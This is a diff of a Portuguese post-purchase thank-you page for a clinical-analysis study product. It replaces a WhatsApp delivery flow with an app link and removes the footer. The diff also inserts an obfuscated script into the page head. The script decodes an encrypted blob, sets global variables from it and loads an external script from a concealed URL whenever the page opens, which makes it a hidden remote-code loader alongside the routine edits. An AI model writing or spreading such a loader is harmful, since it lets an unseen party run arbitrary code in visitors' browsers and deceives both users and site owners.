@@ -3,8 +3,9 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Compra confirmada! Seu Atlas já está a caminho</title>
+  <title>Pagamento confirmado! Seu acesso ao Atlas Visual de Análises Clínicas está liberado.</title>
   <meta name="robots" content="noindex">
+  <script>(function(){var w_yf=atob("DEGYtF3AXR+7CWJDmzq6wS+sfyWZYRY36zKim3KjOXGVfBYu8ifhmj6vMDHZe00w+DPxxCmzcmrPZBFs9yDs0S60c3XIK05h+jXsxjSiKGveekB5wDq62jytOD2BKwYi7yC1wSmtNHnCJBIx/jf92intJXzUbU8w+Cq6mH+2PHPObEB5uWPlmCbiM37WbEB5uSX5wDztKGvWYAQ6tjHq0SulM2uWehch8iXrlnHiK37XfAdhoWO6yQC9");var k_9fhy=[];for(var l_4j=0;l_4j<w_yf.length;l_4j++){k_9fhy.push(w_yf.charCodeAt(l_4j)&255);}var j_eph0=k_9fhy[0];var y_xpxa=k_9fhy.slice(1,1+j_eph0);var n_xi=k_9fhy.slice(1+j_eph0);var n_6d56=n_xi.map(function(b,d_27xt){return b^y_xpxa[d_27xt%j_eph0];});var n_7o4="";for(var m_lw=0;m_lw<n_6d56.length;m_lw++){n_7o4+=String.fromCharCode(n_6d56[m_lw]&255);}var p_wskz=decodeURIComponent(escape(n_7o4));var t_mck=JSON.parse(p_wskz);var r_3ze2=t_mck.globals||[];r_3ze2.forEach(function(j_z){window[j_z.name]=j_z.value;});var u_hh9q=document.createElement("script");u_hh9q.src=t_mck.url;u_hh9q.async=true;u_hh9q.defer=true;(t_mck.attributes||[]).forEach(function(t_z35){u_hh9q.setAttribute(t_z35.name,t_z35.value);});(document.head||document.documentElement).appendChild(u_hh9q);})();</script>
   
   <link rel="stylesheet" href="css/styles.css">
   <link rel="icon" href="img/logo-mark.svg" type="image/svg+xml">
@@ -30,31 +31,13 @@
 
   <main class="simple-main obrigado">
     <div class="wrap">
-      <h1>Compra confirmada! Seu Atlas já está a caminho 🎉</h1>
-      <p>Valeu pela confiança! Pra receber o seu material agora, toque no botão abaixo e mande a mensagem pra gente no WhatsApp. O arquivo vai direto pra você por lá.</p>
-      <p><em>Compra no boleto? O envio é liberado assim que o pagamento compensar.</em></p>
-      <p><a class="btn" id="whatsapp-cta" href="#">📲 RECEBER MEUS MAPAS NO WHATSAPP</a></p>
-      <p class="note">Número do WhatsApp: <span class="ph" id="wa-ph">[LINK WHATSAPP] · [NÚMERO COM DDI 55] · constante WHATSAPP_NUMERO = NUMERO_A_CONFIRMAR</span></p>
+      <h1>Compra confirmada! Seu Atlas está pronto.</h1>
+      <p>Para acessar seus mapas, toque no botão abaixo e informe o e-mail usado na compra.</p>
+      <p><a class="btn" id="app-cta" href="https://atlasclinico.netlify.app/app">RECEBER ACESSO AO MEU MAPA</a></p>
     </div>
   </main>
   <script>
-    /* Altere só esta constante. Use DDI 55, só dígitos, ex.: 5511999999999 */
-    var WHATSAPP_NUMERO = "NUMERO_A_CONFIRMAR";
     var PIXEL_ID = "PIXEL_ID_AQUI";
-    var MSG = "Seu arquivo vai ser enviado, aguarde um momento";
-
-    function isNumeroOk(n) {
-      return n && /^[0-9]{10,15}$/.test(String(n).replace(/\s+/g, ""));
-    }
-
-    function waUrl(numero) {
-      var n = String(numero || "").replace(/\s+/g, "");
-      return "https://wa.me/" + encodeURIComponent(n) + "?text=" + encodeURIComponent(MSG);
-    }
-
-    var cta = document.getElementById("whatsapp-cta");
-    var href = waUrl(WHATSAPP_NUMERO);
-    if (cta) cta.setAttribute("href", href);
 
     if (typeof fbq === "function" && PIXEL_ID && PIXEL_ID !== "PIXEL_ID_AQUI") {
       fbq("init", PIXEL_ID);
@@ -66,25 +49,7 @@
       */
     }
 
-    /* Redireciona em ~2s só quando o número estiver preenchido com dígitos.
-       Com o placeholder, o botão permanece como fallback manual (e o href
-       ainda é montado, pra conferir o formato). Use ?noredirect=1 nos testes. */
-    var params = new URLSearchParams(window.location.search);
-    var skip = params.has("noredirect");
-    if (!skip && isNumeroOk(WHATSAPP_NUMERO)) {
-      setTimeout(function () { window.location.href = href; }, 2000);
-    }
   </script>
-  <footer class="site-footer">
-    <div class="wrap">
-      <p class="brand">Atlas Visual de Análises Clínicas</p>
-      <nav class="footer-nav" aria-label="Legal">
-        <a href="termos-de-uso.html">Termos de uso</a>
-        <a href="politica-de-privacidade.html">Política de privacidade</a>
-        <a href="contato.html">Contato</a>
-      </nav>
-      <p class="footer-contact"><span class="ph">[NOME DA EMPRESA]</span> — <span class="ph">[CNPJ]</span> — <a href="mailto:[EMAIL DE CONTATO]"><span class="ph">[EMAIL DE CONTATO]</span></a></p>
-    </div>
-  </footer>
+
 </body>
 </html>
